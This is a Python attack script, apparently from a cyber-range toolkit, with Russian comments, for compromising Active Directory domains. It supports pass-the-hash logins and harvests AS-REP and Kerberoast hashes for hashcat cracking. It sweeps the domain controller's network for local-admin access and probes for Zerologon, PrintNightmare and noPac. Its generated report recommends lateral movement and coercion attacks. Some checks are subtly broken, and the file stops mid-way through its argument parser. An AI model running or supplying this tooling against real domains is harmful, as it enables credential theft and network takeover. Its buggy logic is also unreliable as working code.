#!/usr/bin/env python3
"""
ad_enum.py — Active Directory enumeration
Standoff 365 Toolkit

Обёртка над impacket, crackmapexec/netexec, ldapdomaindump.
Собирает пользователей, группы, компьютеры, GPO, ACL, SPNs,
AS-REP roastable аккаунты, и строит наглядный отчёт.

Использование:
  python ad_enum.py -d domain.local -u user -p 'Password123' --dc 10.0.0.1
  python ad_enum.py -d domain.local -u user -H NTLM_HASH --dc 10.0.0.1
  python ad_enum.py -d domain.local -u user -p pass --dc 10.0.0.1 --full
"""

import argparse
import json
import os
import shutil
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    HAS_RICH = True
except ImportError:
    HAS_RICH = False

console = Console() if HAS_RICH else None


# =============================================================================
# Утилиты
# =============================================================================

def log(msg, level="info"):
    ts = datetime.now().strftime("%H:%M:%S")
    icons  = {"info": "[*]", "ok": "[+]", "warn": "[!]", "err": "[-]"}
    colors = {"info": "cyan", "ok": "green", "warn": "yellow", "err": "red"}
    if HAS_RICH:
        c = colors.get(level, "white")
        console.print(f"[dim]{ts}[/dim] [{c}]{icons.get(level,'[*]')}[/{c}] {msg}")
    else:
        print(f"{ts} {icons.get(level,'[*]')} {msg}")

def section(title):
    if HAS_RICH:
        console.print(f"\n[bold magenta]{'═'*54}[/bold magenta]")
        console.print(f"[bold magenta]  {title}[/bold magenta]")
        console.print(f"[bold magenta]{'═'*54}[/bold magenta]\n")
    else:
        print(f"\n{'='*54}\n  {title}\n{'='*54}\n")

def save_lines(lines, path):
    Path(path).parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w") as f:
        f.write("\n".join(str(l) for l in lines) + "\n")

def save_json(data, path):
    Path(path).parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def cmd_exists(name):
    return shutil.which(name) is not None

def run(cmd, timeout=120, silent=False, env=None):
    """Запускает команду, возвращает (stdout, stderr, returncode)."""
    if not silent:
        display = " ".join(str(c) for c in cmd)
        # Маскируем пароль в логах
        display = display.replace(cmd[cmd.index("-p")+1] if "-p" in cmd else "", "***") \
            if "-p" in cmd else display
        log(f"$ {display[:120]}", "info")
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            env=env or os.environ
        )
        return result.stdout, result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        log(f"Таймаут ({timeout}s): {cmd[0]}", "warn")
        return "", "", -1
    except FileNotFoundError:
        log(f"Не найден: {cmd[0]}", "err")
        return "", "", -1

def run_save(cmd, out_file, timeout=120, silent=False):
    """Запускает команду и сохраняет stdout в файл."""
    stdout, stderr, rc = run(cmd, timeout=timeout, silent=silent)
    if stdout:
        Path(out_file).parent.mkdir(parents=True, exist_ok=True)
        with open(out_file, "w") as f:
            f.write(stdout)
    return stdout, stderr, rc


# =============================================================================
# Класс конфигурации цели
# =============================================================================

class Target:
    def __init__(self, domain, dc, username, password=None, ntlm_hash=None, out_dir=None):
        self.domain   = domain
        self.dc       = dc
        self.username = username
        self.password = password
        self.ntlm     = ntlm_hash          # формат: LMHASH:NTHASH или просто NT

        # Нормализуем хеш
        if self.ntlm and ":" not in self.ntlm:
            self.ntlm = f"aad3b435b51404eeaad3b435b51404ee:{self.ntlm}"

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.out_dir = Path(out_dir) if out_dir else \
            Path.home() / "standoff-toolkit" / "loot" / f"ad_{domain}_{ts}"
        self.out_dir.mkdir(parents=True, exist_ok=True)

    @property
    def creds_impacket(self):
        """domain/user:pass@dc или domain/user@dc -hashes LM:NT"""
        return f"{self.domain}/{self.username}"

    @property
    def auth_args_impacket(self):
        """Аргументы аутентификации для impacket."""
        if self.ntlm:
            return ["-hashes", self.ntlm, "-dc-ip", self.dc]
        return ["-password", self.password, "-dc-ip", self.dc]

    @property
    def auth_args_cme(self):
        """Аргументы для crackmapexec / netexec."""
        if self.ntlm:
            nt = self.ntlm.split(":")[-1]
            return ["-u", self.username, "-H", nt]
        return ["-u", self.username, "-p", self.password]

    @property
    def auth_args_ldap(self):
        """Аргументы для ldapsearch."""
        if self.ntlm:
            return []  # ldapsearch не поддерживает PtH напрямую
        return [
            "-H", f"ldap://{self.dc}",
            "-D", f"{self.username}@{self.domain}",
            "-w", self.password
        ]


# =============================================================================
# 1. БАЗОВАЯ ПРОВЕРКА ПОДКЛЮЧЕНИЯ
# =============================================================================

def check_connectivity(t: Target):
    section("Проверка подключения к DC")
    results = {}

    # crackmapexec / netexec — самый надёжный способ проверить
    tool = "netexec" if cmd_exists("netexec") else \
           "crackmapexec" if cmd_exists("crackmapexec") else None

    if tool:
        log(f"{tool} smb проверка...", "info")
        stdout, _, rc = run(
            [tool, "smb", t.dc] + t.auth_args_cme,
            timeout=30
        )
        if stdout:
            log(stdout.strip(), "ok" if rc == 0 else "warn")
            results["smb_check"] = stdout.strip()

            # Детект домена, хостнейма, ОС
            for line in stdout.splitlines():
                if "name:" in line.lower() or "domain:" in line.lower():
                    log(f"  {line.strip()}", "info")

    # Проверка LDAP
    log("Проверка LDAP...", "info")
    stdout, _, rc = run(
        ["ldapsearch", "-x",
         "-H", f"ldap://{t.dc}",
         "-b", "",
         "-s", "base",
         "namingContexts"],
        timeout=15, silent=True
    )
    if rc == 0 and stdout:
        for line in stdout.splitlines():
            if "namingContexts" in line:
                log(f"  {line.strip()}", "ok")
                results["naming_contexts"] = line.strip()

    return results


# =============================================================================
# 2. LDAPDOMAINDUMP — полный дамп через LDAP
# =============================================================================

def ldap_dump(t: Target):
    section("LDAP Domain Dump")

    if not cmd_exists("ldapdomaindump"):
        log("ldapdomaindump не найден. pip install ldapdomaindump", "err")
        return {}

    dump_dir = t.out_dir / "ldapdomaindump"
    dump_dir.mkdir(exist_ok=True)

    log("ldapdomaindump — полный дамп AD через LDAP...", "info")

    cmd = [
        "ldapdomaindump",
        "-u", f"{t.domain}\\{t.username}",
        "-o", str(dump_dir),
        "--no-html",   # только JSON + grep-able
    ]
    if t.ntlm:
        # ldapdomaindump поддерживает NT хеш через -p с форматом :NTHASH
        nt = t.ntlm.split(":")[-1]
        cmd += ["-p", f":{nt}"]
    else:
        cmd += ["-p", t.password]
    cmd.append(t.dc)

    stdout, stderr, rc = run(cmd, timeout=300)

    if rc == 0:
        log("ldapdomaindump завершён успешно", "ok")
        # Список файлов
        for f in sorted(dump_dir.glob("*.json")):
            size = f.stat().st_size
            log(f"  {f.name} ({size} байт)", "info")
    else:
        log(f"ldapdomaindump ошибка: {stderr[:200]}", "warn")

    return {"dump_dir": str(dump_dir)}


# =============================================================================
# 3. ПОЛЬЗОВАТЕЛИ
# =============================================================================

def enum_users(t: Target):
    section("Перечисление пользователей")

    users_dir = t.out_dir / "users"
    users_dir.mkdir(exist_ok=True)
    results = {"users": [], "privileged": [], "asreproastable": [], "kerberoastable": []}

    tool = "netexec" if cmd_exists("netexec") else \
           "crackmapexec" if cmd_exists("crackmapexec") else None

    # --- Список всех пользователей через CME/NetExec ---
    if tool:
        log(f"Список пользователей ({tool})...", "info")
        stdout, _, rc = run(
            [tool, "ldap", t.dc] + t.auth_args_cme + ["--users"],
            timeout=120
        )
        if stdout:
            save_lines(stdout.splitlines(), users_dir / "cme_users.txt")
            # Парсим usernames
            users = []
            for line in stdout.splitlines():
                # Типичный формат CME: ...  username  badpwdcount  desc
                if t.domain.upper() in line or "\\" in line:
                    parts = line.split()
                    for i, p in enumerate(parts):
                        if "\\" in p:
                            user = p.split("\\")[-1].strip()
                            if user and user not in ("", t.domain.upper()):
                                users.append(user)
            results["users"] = list(set(users))
            log(f"Пользователей найдено: {len(results['users'])}", "ok")

    # --- GetADUsers через impacket ---
    if cmd_exists("impacket-GetADUsers") or cmd_exists("GetADUsers.py"):
        binary = "impacket-GetADUsers" if cmd_exists("impacket-GetADUsers") else "GetADUsers.py"
        log(f"impacket GetADUsers...", "info")
        cmd = [binary, "-all", f"{t.domain}/{t.username}"] + t.auth_args_impacket
        stdout, _, rc = run_save(cmd, users_dir / "GetADUsers.txt", timeout=60)
        if stdout:
            # Парсим из impacket вывода
            for line in stdout.splitlines():
                if line.strip() and not line.startswith("[") and not line.startswith("Name"):
                    parts = line.split()
                    if parts:
                        results["users"].append(parts[0])

    results["users"] = sorted(set(results["users"]))
    if results["users"]:
        save_lines(results["users"], users_dir / "usernames.txt")
        log(f"Итого уникальных пользователей: {len(results['users'])}", "ok")

    # --- AS-REP Roastable пользователи ---
    log("AS-REP Roasting — пользователи без Kerberos preauth...", "info")
    if cmd_exists("impacket-GetNPUsers") or cmd_exists("GetNPUsers.py"):
        binary = "impacket-GetNPUsers" if cmd_exists("impacket-GetNPUsers") else "GetNPUsers.py"
        asrep_out = users_dir / "asreproast_hashes.txt"
        cmd = [
            binary,
            f"{t.domain}/",
            "-usersfile", str(users_dir / "usernames.txt"),
            "-no-pass",
            "-dc-ip", t.dc,
            "-outputfile", str(asrep_out),
            "-format", "hashcat"
        ]
        stdout, _, rc = run(cmd, timeout=120)
        if asrep_out.exists():
            hashes = [l for l in asrep_out.read_text().splitlines() if l.strip()]
            if hashes:
                log(f"AS-REP Roastable: {len(hashes)} аккаунтов!", "warn")
                for h in hashes:
                    user = h.split("$")[3].split("@")[0] if "$" in h else h[:30]
                    log(f"  {user}", "warn")
                results["asreproastable"] = hashes
                log(f"Хеши → {asrep_out}", "ok")
                log("Крек: hashcat -m 18200 asreproast_hashes.txt rockyou.txt", "info")
            else:
                log("AS-REP Roastable: не найдено", "info")

    # --- Kerberoastable (SPNs) ---
    log("Kerberoasting — пользователи с SPN...", "info")
    if cmd_exists("impacket-GetUserSPNs") or cmd_exists("GetUserSPNs.py"):
        binary = "impacket-GetUserSPNs" if cmd_exists("impacket-GetUserSPNs") else "GetUserSPNs.py"
        kerb_out = users_dir / "kerberoast_hashes.txt"
        cmd = [binary, f"{t.domain}/{t.username}"] + t.auth_args_impacket + \
              ["-request", "-outputfile", str(kerb_out), "-dc-ip", t.dc]
        stdout, _, rc = run(cmd, timeout=120)
        if stdout:
            save_lines(stdout.splitlines(), users_dir / "kerberoast_raw.txt")

        if kerb_out.exists():
            hashes = [l for l in kerb_out.read_text().splitlines() if l.strip()]
            if hashes:
                log(f"Kerberoastable: {len(hashes)} SPN!", "warn")
                results["kerberoastable"] = hashes
                log(f"Хеши → {kerb_out}", "ok")
                log("Крек: hashcat -m 13100 kerberoast_hashes.txt rockyou.txt", "info")
            else:
                log("Kerberoastable: не найдено", "info")

    # --- Привилегированные пользователи ---
    log("Проверка привилегированных аккаунтов...", "info")
    if tool:
        priv_groups = ["Domain Admins", "Enterprise Admins", "Schema Admins",
                       "Administrators", "Account Operators", "Backup Operators"]
        for group in priv_groups:
            stdout, _, rc = run(
                [tool, "ldap", t.dc] + t.auth_args_cme +
                ["--groups", "--filter", group],
                timeout=30, silent=True
            )
            if stdout and rc == 0:
                members = [l.strip() for l in stdout.splitlines() if l.strip()]
                if members:
                    log(f"  {group}: {len(members)} членов", "warn")
                    results["privileged"].extend(members)

    save_json(results, users_dir / "users_summary.json")
    return results


# =============================================================================
# 4. ГРУППЫ
# =============================================================================

def enum_groups(t: Target):
    section("Перечисление групп")
    groups_dir = t.out_dir / "groups"
    groups_dir.mkdir(exist_ok=True)
    results = {}

    tool = "netexec" if cmd_exists("netexec") else \
           "crackmapexec" if cmd_exists("crackmapexec") else None

    if tool:
        log(f"Список групп ({tool})...", "info")
        stdout, _, rc = run(
            [tool, "ldap", t.dc] + t.auth_args_cme + ["--groups"],
            timeout=120
        )
        if stdout:
            save_lines(stdout.splitlines(), groups_dir / "all_groups.txt")
            log(f"Группы сохранены", "ok")
            results["raw"] = stdout

    # Через rpcclient
    if cmd_exists("rpcclient"):
        log("rpcclient enumdomgroups...", "info")
        if t.password:
            stdout, _, _ = run(
                ["rpcclient", "-U", f"{t.username}%{t.password}",
                 "-c", "enumdomgroups", t.dc],
                timeout=30
            )
        else:
            stdout = ""
        if stdout:
            save_lines(stdout.splitlines(), groups_dir / "rpc_groups.txt")

    return results


# =============================================================================
# 5. КОМПЬЮТЕРЫ
# =============================================================================

def enum_computers(t: Target):
    section("Перечисление компьютеров")
    comp_dir = t.out_dir / "computers"
    comp_dir.mkdir(exist_ok=True)
    results = {"computers": [], "interesting": []}

    tool = "netexec" if cmd_exists("netexec") else \
           "crackmapexec" if cmd_exists("crackmapexec") else None

    if tool:
        # Список компьютеров
        log(f"Список компьютеров ({tool})...", "info")
        stdout, _, rc = run(
            [tool, "smb", t.dc] + t.auth_args_cme + ["--computers"],
            timeout=120
        )
        if stdout:
            save_lines(stdout.splitlines(), comp_dir / "computers_smb.txt")

            # Парсим компьютеры и OS
            for line in stdout.splitlines():
                if "Windows" in line or "Server" in line:
                    results["computers"].append(line.strip())
                    # Интересные: старые ОС
                    if any(old in line for old in
                           ["2003", "2008", "XP", "Vista", "Windows 7",
                            "Windows 8", "2012"]):
                        results["interesting"].append(line.strip())
                        log(f"  Устаревшая ОС: {line.strip()}", "warn")

        # Проверяем SMB signing (важно для relay атак)
        log("Проверка SMB signing...", "info")
        stdout, _, _ = run(
            [tool, "smb", t.dc] + t.auth_args_cme + ["--gen-relay-list",
             str(comp_dir / "smb_no_signing.txt")],
            timeout=120
        )
        no_sign_file = comp_dir / "smb_no_signing.txt"
        if no_sign_file.exists():
            hosts = [l for l in no_sign_file.read_text().splitlines() if l.strip()]
            if hosts:
                log(f"SMB Signing отключён на {len(hosts)} хостах → NTLM relay возможен!", "warn")
                results["smb_no_signing"] = hosts

    # ldap computers через impacket
    log("LDAP поиск компьютеров с Unconstrained Delegation...", "info")
    stdout, _, _ = run(
        ["ldapsearch", "-x"] + t.auth_args_ldap +
        ["-b", f"DC={t.domain.replace('.', ',DC=')}",
         "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))",
         "sAMAccountName", "operatingSystem"],
        timeout=30, silent=True
    )
    if stdout and "sAMAccountName" in stdout:
        unconstrained = re.findall(r'sAMAccountName: (.+)', stdout)
        if unconstrained:
            log(f"Unconstrained Delegation на: {unconstrained}", "warn")
            results["unconstrained_delegation"] = unconstrained
            save_lines(unconstrained, comp_dir / "unconstrained_delegation.txt")

    save_json(results, comp_dir / "computers_summary.json")
    return results


# =============================================================================
# 6. SHARES / SMB
# =============================================================================

def enum_shares(t: Target):
    section("SMB Shares")
    shares_dir = t.out_dir / "shares"
    shares_dir.mkdir(exist_ok=True)
    results = {"shares": [], "readable": [], "writable": []}

    tool = "netexec" if cmd_exists("netexec") else \
           "crackmapexec" if cmd_exists("crackmapexec") else None

    if tool:
        log(f"Перечисление шар на DC ({tool})...", "info")
        stdout, _, rc = run(
            [tool, "smb", t.dc] + t.auth_args_cme + ["--shares"],
            timeout=60
        )
        if stdout:
            save_lines(stdout.splitlines(), shares_dir / "shares_dc.txt")
            for line in stdout.splitlines():
                if "READ" in line or "WRITE" in line:
                    results["shares"].append(line.strip())
                    if "WRITE" in line:
                        results["writable"].append(line.strip())
                        log(f"  WRITE: {line.strip()}", "warn")
                    elif "READ" in line:
                        results["readable"].append(line.strip())
                        log(f"  READ:  {line.strip()}", "ok")

    # smbclient список шар
    if cmd_exists("smbclient"):
        log("smbclient список шар...", "info")
        if t.password:
            stdout, _, _ = run(
                ["smbclient", "-L", f"//{t.dc}",
                 "-U", f"{t.username}%{t.password}",
                 "-W", t.domain],
                timeout=30
            )
        elif t.ntlm:
            stdout, _, _ = run(
                ["smbclient", "-L", f"//{t.dc}",
                 "-U", f"{t.username}%",
                 "--pw-nt-hash",
                 t.ntlm.split(":")[-1],
                 "-W", t.domain],
                timeout=30
            )
        else:
            stdout = ""
        if stdout:
            save_lines(stdout.splitlines(), shares_dir / "smbclient_list.txt")

    # Поиск GPP паролей в SYSVOL
    log("Поиск GPP паролей в SYSVOL...", "info")
    if t.password:
        stdout, _, _ = run(
            ["smbclient", f"//{t.dc}/SYSVOL",
             "-U", f"{t.username}%{t.password}",
             "-c", "recurse; ls"],
            timeout=30, silent=True
        )
        # Если есть доступ к SYSVOL, ищем cpassword
        if stdout and "cpassword" in stdout.lower():
            log("GPP cpassword найден в SYSVOL!", "warn")
            results["gpp_cpassword"] = True

    save_json(results, shares_dir / "shares_summary.json")
    return results


# =============================================================================
# 7. PASSWORD POLICY
# =============================================================================

def get_password_policy(t: Target):
    section("Парольная политика")
    policy_dir = t.out_dir / "policy"
    policy_dir.mkdir(exist_ok=True)
    results = {}

    tool = "netexec" if cmd_exists("netexec") else \
           "crackmapexec" if cmd_exists("crackmapexec") else None

    if tool:
        log("Получение парольной политики...", "info")
        stdout, _, rc = run(
            [tool, "smb", t.dc] + t.auth_args_cme + ["--pass-pol"],
            timeout=60
        )
        if stdout:
            save_lines(stdout.splitlines(), policy_dir / "password_policy.txt")
            log(stdout.strip(), "ok")
            results["raw"] = stdout

            # Парсим lockout threshold — критично для spray
            for line in stdout.splitlines():
                if "lockout" in line.lower():
                    log(f"  {line.strip()}", "warn")
                    if "threshold" in line.lower():
                        import re
                        nums = re.findall(r'\d+', line)
                        if nums:
                            threshold = int(nums[0])
                            results["lockout_threshold"] = threshold
                            if threshold == 0:
                                log("Lockout ОТКЛЮЧЁН — можно брутить!", "warn")
                            else:
                                log(f"Lockout после {threshold} попыток — осторожно со spray!", "warn")

    # Через enum4linux-ng
    if cmd_exists("enum4linux-ng"):
        log("enum4linux-ng...", "info")
        if t.password:
            stdout, _, _ = run(
                ["enum4linux-ng", "-A",
                 "-u", t.username, "-p", t.password, t.dc],
                timeout=120
            )
            if stdout:
                save_lines(stdout.splitlines(), policy_dir / "enum4linux_ng.txt")

    return results


# =============================================================================
# 8. BLOODHOUND СБОР
# =============================================================================

def bloodhound_collect(t: Target):
    section("BloodHound Data Collection")
    bh_dir = t.out_dir / "bloodhound"
    bh_dir.mkdir(exist_ok=True)

    if not cmd_exists("bloodhound-python"):
        log("bloodhound-python не найден. pip install bloodhound", "err")
        return {}

    log("bloodhound-python — сбор данных AD...", "info")
    log("Это займёт некоторое время...", "info")

    cmd = [
        "bloodhound-python",
        "-d", t.domain,
        "-u", t.username,
        "-ns", t.dc,
        "-c", "All",          # DCOnly для тихого режима
        "--zip",
        "-o", str(bh_dir),
        "--disable-pooling",
    ]

    if t.ntlm:
        cmd += ["--hashes", t.ntlm]
    else:
        cmd += ["-p", t.password]

    stdout, stderr, rc = run(cmd, timeout=600)

    zip_files = list(bh_dir.glob("*.zip"))
    json_files = list(bh_dir.glob("*.json"))

    if zip_files or json_files:
        log(f"BloodHound данные собраны!", "ok")
        for f in zip_files + json_files:
            log(f"  {f.name} ({f.stat().st_size} байт)", "info")
        log("Импортируй в BloodHound GUI для анализа путей атаки", "info")
        log("Запросы: 'Shortest Path to DA', 'Kerberoastable Users'", "info")
        return {"files": [str(f) for f in zip_files + json_files]}
    else:
        log(f"BloodHound: ошибка сбора. stderr: {stderr[:300]}", "err")
        return {}


# =============================================================================
# 9. ПРОВЕРКА ЛОКАЛЬНОГО АДМИНА НА ХОСТАХ
# =============================================================================

def check_local_admin(t: Target, targets_file=None):
    section("Проверка Local Admin (Lateral Movement)")
    la_dir = t.out_dir / "local_admin"
    la_dir.mkdir(exist_ok=True)

    tool = "netexec" if cmd_exists("netexec") else \
           "crackmapexec" if cmd_exists("crackmapexec") else None

    if not tool:
        log("netexec/crackmapexec не найден", "err")
        return {}

    # Если есть файл с таргетами — используем его
    if targets_file and Path(targets_file).exists():
        target_arg = targets_file
    else:
        # Берём /24 сеть DC
        dc_net = ".".join(t.dc.split(".")[:3]) + ".0/24"
        target_arg = dc_net
        log(f"Файл таргетов не указан, сканируем сеть DC: {dc_net}", "info")

    log(f"Проверка local admin прав на {target_arg}...", "info")
    stdout, _, rc = run(
        [tool, "smb", target_arg] + t.auth_args_cme,
        timeout=300
    )
    if stdout:
        save_lines(stdout.splitlines(), la_dir / "smb_sweep.txt")

        # Ищем Pwn3d! — там где есть локальный админ
        admin_hosts = []
        for line in stdout.splitlines():
            if "Pwn3d!" in line or "pwn3d" in line.lower():
                admin_hosts.append(line.strip())
                log(f"  LOCAL ADMIN: {line.strip()}", "warn")

        if admin_hosts:
            save_lines(admin_hosts, la_dir / "admin_hosts.txt")
            log(f"Локальный админ на {len(admin_hosts)} хостах!", "warn")
            return {"admin_hosts": admin_hosts}
        else:
            log("Локальный админ: не найдено на текущих хостах", "info")

    return {}


# =============================================================================
# 10. ПРОВЕРКА ИЗВЕСТНЫХ УЯЗВИМОСТЕЙ AD
# =============================================================================

def check_ad_vulns(t: Target):
    section("Проверка уязвимостей AD")
    vuln_dir = t.out_dir / "vulns"
    vuln_dir.mkdir(exist_ok=True)
    findings = []

    tool = "netexec" if cmd_exists("netexec") else \
           "crackmapexec" if cmd_exists("crackmapexec") else None

    if not tool:
        return {}

    # --- Zerologon (CVE-2020-1472) ---
    log("Zerologon (CVE-2020-1472)...", "info")
    stdout, _, rc = run(
        [tool, "smb", t.dc] + t.auth_args_cme +
        ["-M", "zerologon"],
        timeout=30
    )
    if stdout:
        save_lines(stdout.splitlines(), vuln_dir / "zerologon.txt")
        if "VULNERABLE" in stdout.upper():
            findings.append("CVE-2020-1472 Zerologon — УЯЗВИМ!")
            log("УЯЗВИМ: Zerologon CVE-2020-1472!", "warn")

    # --- PrintNightmare (CVE-2021-1675) ---
    log("PrintNightmare (CVE-2021-1675)...", "info")
    stdout, _, rc = run(
        [tool, "smb", t.dc] + t.auth_args_cme +
        ["-M", "printnightmare"],
        timeout=30
    )
    if stdout:
        save_lines(stdout.splitlines(), vuln_dir / "printnightmare.txt")
        if "VULNERABLE" in stdout.upper():
            findings.append("CVE-2021-1675 PrintNightmare — УЯЗВИМ!")
            log("УЯЗВИМ: PrintNightmare CVE-2021-1675!", "warn")

    # --- noPac (CVE-2021-42278/42287) ---
    log("noPac (CVE-2021-42278/42287)...", "info")
    stdout, _, rc = run(
        [tool, "smb", t.dc] + t.auth_args_cme +
        ["-M", "nopac"],
        timeout=30
    )
    if stdout:
        save_lines(stdout.splitlines(), vuln_dir / "nopac.txt")
        if "VULNERABLE" in stdout.upper():
            findings.append("CVE-2021-42278/42287 noPac — УЯЗВИМ!")
            log("УЯЗВИМ: noPac CVE-2021-42278/42287!", "warn")

    # --- SMB Signing ---
    log("SMB Signing...", "info")
    stdout, _, _ = run(
        [tool, "smb", t.dc] + t.auth_args_cme,
        timeout=30, silent=True
    )
    if stdout and "signing:False" in stdout.lower():
        findings.append("SMB Signing отключён → NTLM Relay возможен")
        log("SMB Signing отключён → NTLM Relay возможен!", "warn")

    # --- LDAP Signing ---
    log("LDAP Signing...", "info")
    stdout, _, _ = run(
        [tool, "ldap", t.dc] + t.auth_args_cme +
        ["-M", "ldap-checker"],
        timeout=30
    )
    if stdout:
        save_lines(stdout.splitlines(), vuln_dir / "ldap_signing.txt")
        if "VULNERABLE" in stdout.upper() or "signing: False" in stdout.lower():
            findings.append("LDAP Signing/Channel Binding отключён")
            log("LDAP Signing/Channel Binding отключён!", "warn")

    # --- AD CS (Certipy) ---
    if cmd_exists("certipy"):
        log("AD CS уязвимости (Certipy)...", "info")
        certipy_out = vuln_dir / "certipy_find.txt"
        cmd = [
            "certipy", "find",
            "-u", f"{t.username}@{t.domain}",
            "-dc-ip", t.dc,
            "-vulnerable", "-stdout",
        ]
        if t.ntlm:
            cmd += ["-hashes", t.ntlm]
        else:
            cmd += ["-p", t.password]

        stdout, _, rc = run_save(cmd, certipy_out, timeout=120)
        if stdout and ("ESC" in stdout or "Vulnerable" in stdout):
            log("Certipy нашёл уязвимые Certificate Templates!", "warn")
            for line in stdout.splitlines():
                if "ESC" in line or "Vulnerable" in line:
                    findings.append(f"AD CS: {line.strip()}")
                    log(f"  {line.strip()}", "warn")

    if findings:
        save_lines(findings, vuln_dir / "vuln_summary.txt")
        log(f"Найдено уязвимостей: {len(findings)}", "warn")
    else:
        log("Явных уязвимостей не обнаружено", "ok")

    return {"findings": findings}


# =============================================================================
# ИТОГОВЫЙ ОТЧЁТ
# =============================================================================

def generate_report(t: Target, all_results: dict):
    section("Итоговый отчёт")

    report = t.out_dir / "AD_ENUM_REPORT.md"
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    users_r   = all_results.get("users", {})
    vulns_r   = all_results.get("vulns", {})
    shares_r  = all_results.get("shares", {})
    policy_r  = all_results.get("policy", {})
    comps_r   = all_results.get("computers", {})
    la_r      = all_results.get("local_admin", {})
    bh_r      = all_results.get("bloodhound", {})

    # Критичные находки
    critical = []
    if users_r.get("asreproastable"):
        critical.append(f"AS-REP Roastable: {len(users_r['asreproastable'])} аккаунтов")
    if users_r.get("kerberoastable"):
        critical.append(f"Kerberoastable: {len(users_r['kerberoastable'])} SPN")
    if shares_r.get("writable"):
        critical.append(f"Записываемые шары: {len(shares_r['writable'])}")
    if la_r.get("admin_hosts"):
        critical.append(f"Local Admin на {len(la_r['admin_hosts'])} хостах")
    for finding in vulns_r.get("findings", []):
        critical.append(finding)
    if comps_r.get("unconstrained_delegation"):
        critical.append(f"Unconstrained Delegation: {comps_r['unconstrained_delegation']}")
    if comps_r.get("smb_no_signing"):
        critical.append(f"SMB без подписи на {len(comps_r['smb_no_signing'])} хостах")

    lines = [
        f"# AD Enumeration Report",
        f"**Домен:** {t.domain}",
        f"**DC:** {t.dc}",
        f"**Пользователь:** {t.username}",
        f"**Дата:** {ts}",
        "", "---", "",
        "## ⚡ TL;DR — Критичные находки", "",
    ]

    if critical:
        for c in critical:
            lines.append(f"- ⚠️ {c}")
    else:
        lines.append("- Критичных находок не обнаружено")
    lines.append("")

    # Пользователи
    users = users_r.get("users", [])
    lines += [
        "## Пользователи", "",
        f"**Всего:** {len(users)}",
        "",
    ]
    if users_r.get("asreproastable"):
        lines += [
            "### AS-REP Roastable",
            "```",
        ]
        lines.extend(users_r["asreproastable"][:10])
        lines += ["```", ""]
        lines.append("**Крек:** `hashcat -m 18200 asreproast_hashes.txt rockyou.txt`")
        lines.append("")

    if users_r.get("kerberoastable"):
        lines += [
            "### Kerberoastable (SPNs)",
            f"Найдено: {len(users_r['kerberoastable'])}",
            "",
            "**Крек:** `hashcat -m 13100 kerberoast_hashes.txt rockyou.txt`",
            "",
        ]

    # Shares
    if shares_r.get("writable"):
        lines += ["## Записываемые шары", ""]
        for s in shares_r["writable"]:
            lines.append(f"- {s}")
        lines.append("")

    # Local Admin
    if la_r.get("admin_hosts"):
        lines += ["## Local Admin (Lateral Movement)", ""]
        for h in la_r["admin_hosts"]:
            lines.append(f"- {h}")
        lines.append("")

    # Уязвимости
    if vulns_r.get("findings"):
        lines += ["## Уязвимости AD", ""]
        for f in vulns_r["findings"]:
            lines.append(f"- ⚠️ {f}")
        lines.append("")

    # Следующие шаги
    lines += [
        "---",
        "## Следующие шаги", "",
    ]
    if users_r.get("asreproastable"):
        lines.append("1. `hashcat -m 18200 users/asreproast_hashes.txt rockyou.txt`")
    if users_r.get("kerberoastable"):
        lines.append("2. `hashcat -m 13100 users/kerberoast_hashes.txt rockyou.txt`")
    if bh_r.get("files"):
        lines.append("3. Импортируй BloodHound данные → ищи Shortest Path to DA")
    if la_r.get("admin_hosts"):
        lines.append("4. Используй local admin для lateral movement (PtH/PtT)")
    if comps_r.get("unconstrained_delegation"):
        lines.append("5. Unconstrained Delegation → SpoolSample/PetitPotam → TGT")

    lines += [
        "",
        "---",
        f"*Отчёт сгенерирован: {ts}*"
    ]

    report.write_text("\n".join(lines))
    log(f"Отчёт: {report}", "ok")

    # Rich таблица итогов
    if HAS_RICH:
        table = Table(title="AD Enumeration Summary", header_style="bold cyan")
        table.add_column("Параметр", style="cyan")
        table.add_column("Значение", style="bold green")

        table.add_row("Домен", t.domain)
        table.add_row("DC", t.dc)
        table.add_row("Пользователей", str(len(users)))
        table.add_row("AS-REP Roastable", str(len(users_r.get("asreproastable", []))))
        table.add_row("Kerberoastable", str(len(users_r.get("kerberoastable", []))))
        table.add_row("Уязвимости", str(len(vulns_r.get("findings", []))))
        table.add_row("Local Admin хосты", str(len(la_r.get("admin_hosts", []))))
        table.add_row("BloodHound", "Собран" if bh_r.get("files") else "Нет")

        console.print("\n")
        console.print(table)

        if critical:
            console.print("\n[bold red]⚠️  Критичные находки:[/bold red]")
            for c in critical:
                console.print(f"  [red]• {c}[/red]")


# =============================================================================
# MAIN
# =============================================================================

def parse_args():
    p = argparse.ArgumentParser(
        description="ad_enum.py — Active Directory enumeration",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Примеры:
  # Пароль
  python ad_enum.py -d corp.local -u john -p 'Password123' --dc 10.0.0.1

  # NTLM хеш (Pass-the-Hash)
  python ad_enum.py -d corp.local -u john -H aad3b435b51404ee:31d6c... --dc 10.0.0.1

  # Полный режим (включая BloodHound + проверка локального админа)
  python ad_enum.py -d corp.local -u john -p pass --dc 10.0.0.1 --full

  # Только уязвимости
  python ad_enum.py -d corp.local -u john -p pass --dc 10.0.0.1 --only-vulns
        """
    )
    p.add_argument("-d", "--domain",   required=True, help="Домен (corp.local)")
    p.add_argument("-u", "--username", required=True, help="Имя пользователя")
    p.add_argument("-p", "--password", default="",    help="Пароль")
    p.add_argument("-H", "--hash",     default="",    help="NTLM хеш (LM:NT или просто NT)")
    p.add_argument("--dc",             required=True, help="IP адрес Domain Controller")
    p.add_argument("--out",            help="Директория для результатов")
    p.add_argument("--full",           action="store_true",
                   help="Полный режим (BloodHound + local admin sweep)")
    p.add_argument("--targets",        help="Файл с IP для проверки local admin")
    p.add_argument("--only-users",     action="store_true")
    p.add_argument("--only-vulns",     action="store_true")
    p.add_argument("--skip-bloodhound", action="store_true")
